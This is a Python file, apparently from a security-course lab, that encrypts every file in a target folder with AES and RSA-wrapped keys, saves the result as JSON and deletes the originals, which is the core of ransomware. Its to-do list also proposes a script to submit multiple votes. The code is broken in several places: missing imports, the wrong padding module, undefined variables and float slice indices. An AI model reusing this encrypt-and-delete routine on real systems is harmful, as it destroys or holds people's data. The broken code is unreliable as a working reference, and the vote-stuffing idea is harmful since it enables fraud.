from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from getpass import getpass
from os import walk, getcwd, listdir, remove
from os.path import isfile
from json import dump
from sys import argv

from handlers import cd
from encryption import myFileEncryptMAC

'''
    TO-DO:
        - update target directory
        - save file names
        - directory walk
        - flag for files already encrypted (to prevent double encryption)

        - implement decrypt functions (decrypt, save file,)

    BONUS-LAB:
        - must be able to describe weaknesses of implementation

    OTHER-BONUS:
        - write a script to submit multiple votes 
'''

# Debug flag for testing purposes
DEBUG = False

# Get directory of script
CWD = getcwd()

# Default RSA key to an empty string unless password is given as command-line argument
RSA_PRIVATE_KEY_PASSWORD = '' if len(argv) <= 1 else argv[1]

# Initialize default key paths relative to script directory {CWD}
RSA_PRIVATE_KEY_PATH = f'{CWD}/keys/private_key.pem'
RSA_PUBLIC_KEY_PATH = f'{CWD}/keys/public_key.pem'

# Default backend used for cryptography libraries
BACKEND = default_backend()

def myRSAEncrypt(filepath, RSA_Publickey_filepath=RSA_PUBLIC_KEY_PATH):
    '''
        Encrypts the file at the given path using the RSA encryption method with OAEP padding.
    '''
    C, IV, tag, Enckey, HMACKey, ext = myFileEncryptMAC(filepath)

    try:
        # Open and load the public key file to initialize a public key encryption object
        with open(RSA_Publickey_filepath, 'rb') as key_file:
            public_key = serialization.load_pem_public_key(key_file.read(), backend=BACKEND)
    except FileNotFoundError as e:
        print('A public key was missing at the specified path.')
        exit(1)
    
    # Concatenate encryption key and HMAC key to serve as the RSA encryption input
    RSAInput = Enckey + HMACKey

    # Use the public key object to encrypt the data
    RSACipher = public_key.encrypt(RSAInput, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(),label=None))

    return (RSACipher, C, IV, tag, ext)

def myRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath=RSA_PRIVATE_KEY_PATH):
    '''
        Runs the RSA decryption method on a file using the private key at the given path.
    '''
    try:
        # Open and load the private key file to initialize a private key decryption object
        with open(RSA_Privatekey_filepath, 'rb') as key_file:
            private_key = serialization.load_pem_private_key(key_file.read(), password=RSA_PRIVATE_KEY_PASSWORD, backend=BACKEND)
    except TypeError as e:
        # serialization.load_pem_private_key raises a TypeError for issues with password argument 
        # Try loading the .pem file without a password
        with open(RSA_Privatekey_filepath, 'rb') as key_file:
            private_key = serialization.load_pem_private_key(key_file.read(), backend=BACKEND)
    except FileNotFoundError as e:
        print('A private key was missing at the specified path.')
        exit(1)

    # Use the private key object to decrypt
    result = private_key.decrypt(RSACipher, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    
    # Both encryption key and HMAC key are expected to be the same size, therefore split the decrypted data directly in half
    Enckey, HMACKey = result[:len(result) / 2], result[len(result) / 2:]

    # Decrypt file inside or outside RSA decryption method?
    # M = myFileDecryptMAC(filename, Enckey, HMACKey, IV, tag)

    return (Enckey, HMACKey)

def generateKeyPair(private_key_path, public_key_path, public_exponent=65537, key_size=2048, backend=BACKEND, password_required=True):
    '''
        Generates a private and public RSA key pair at the given paths.
    '''
    if password_required:
        print('Enter a password for the private key:')
        key_passphrase = getpass() # Hide text while password is entered
        encryption_algorithm = serialization.BestAvailableEncryption(key_passphrase)
    else:
        encryption_algorithm = serialization.NoEncryption()

    # Generate RSA private key
    key = rsa.generate_private_key(public_exponent=public_exponent,key_size=key_size,backend=backend)

    # Save the private key
    with open(private_key_path, 'wb') as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=encryption_algorithm
        ))

    # Save the public key
    with open(public_key_path, 'wb') as f:
        f.write(key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    
    return key_passphrase

def main():

    global RSA_PRIVATE_KEY_PASSWORD

    # Check if a .pem file for private key exists
    if not(isfile(RSA_PRIVATE_KEY_PATH)):
        print('A .pem file containing a private key is missing. Generating a new one...')
        RSA_PRIVATE_KEY_PASSWORD = generateKeyPair(RSA_PRIVATE_KEY_PATH, RSA_PUBLIC_KEY_PATH)

    # Initialize target directory to encrypt relative to directory of script {CWD}
    TARGET_DIR = f'{CWD}/files-to-RSA-encrypt'

    # Get target files from directory
    # NOTE: May want to use os.walk instead of listdir
    target_files = listdir(TARGET_DIR)

    # cd is a contextmanager that ensures all operations are not
    # executed outside the target directory (even when Exceptions are raised)
    with cd(TARGET_DIR):
        for target_file in target_files:
            # Initialize JSON output as dictionary
            output = dict()

            # NOTE: Can be written in one line
            RSACipher, C, IV, tag, ext = myRSAEncrypt(target_file) 
            output['RSACipher'] = RSACipher
            output['C'] = C
            output['IV'] = IV
            output['tag'] = tag
            output['ext'] = ext

            # TO-DO: Need to solve encoding
            with open(f'{target_file}-out.json', 'wb') as fp:
                dump(output, fp)
            
            # Delete original file using os module
            remove(filename)


    for result in results:
        pass

if __name__ == '__main__':
    main()
